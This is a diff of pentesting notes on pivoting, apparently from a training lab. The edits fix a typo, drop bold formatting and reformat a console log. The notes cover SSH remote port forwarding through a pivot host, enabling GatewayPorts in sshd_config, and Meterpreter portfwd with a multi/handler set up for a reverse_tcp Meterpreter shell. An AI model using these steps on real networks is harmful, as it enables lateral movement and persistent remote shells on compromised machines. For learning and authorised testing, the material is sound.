@@ -31,14 +31,14 @@ SSH -R
 ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 -N ubuntu@<ipAddressofTarget> -vN
 #Telling ssh to open a listening port, which is port 8080 on attack host.
 #0.0.0.0:8080: Fowarding destination.
-#-N: Don't cheate a shell interface.
+#-N: Don't create a shell interface.
 ```
 
 `sshd_config` - Linux man page
 
 ```bash
 GatewayPorts  
-Specifies whether remote hosts are allowed to connect to ports forwarded for the client. By default, sshd(8) binds remote port forwardings to the loopback address. This prevents other remote hosts from connecting to forwarded ports. **GatewayPorts** can be used to specify that sshd should allow remote port forwardings to bind to non-loopback addresses, thus allowing other hosts to connect. The argument may be ''no'' to force remote port forwardings to be available to the local host only, ''yes'' to force remote port forwardings to bind to the wildcard address, or ''clientspecified'' to allow the client to select the address to which the forwarding is bound. The default is ''no''.
+Specifies whether remote hosts are allowed to connect to ports forwarded for the client. By default, sshd(8) binds remote port forwardings to the loopback address. This prevents other remote hosts from connecting to forwarded ports. GatewayPorts can be used to specify that sshd should allow remote port forwardings to bind to non-loopback addresses, thus allowing other hosts to connect. The argument may be ''no'' to force remote port forwardings to be available to the local host only, ''yes'' to force remote port forwardings to bind to the wildcard address, or ''clientspecified'' to allow the client to select the address to which the forwarding is bound. The default is ''no''.
 ```
 
 It doesn't allow other to connect in in default,so we have to modify `/etc/ssh/sshd_config` on `ubuntu` server.
@@ -87,7 +87,10 @@ meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
 
 Configuring & Starting multi/handler
 ```bash
-meterpreter > bg [*] Backgrounding session 1... msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp payload => windows/x64/meterpreter/reverse_tcp msf
+meterpreter > bg 
+[*] Backgrounding session 1... 
+
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp payload => windows/x64/meterpreter/reverse_tcp msf
 exploit(multi/handler) > set LPORT 8081 LPORT => 8081 msf exploit(multi/handler) > set LHOST 0.0.0.0 LHOST => 0.0.0.0 msf exploit(multi/handler) > run [*] Started reverse TCP handler on 0.0.0.0:8081
 ```
 
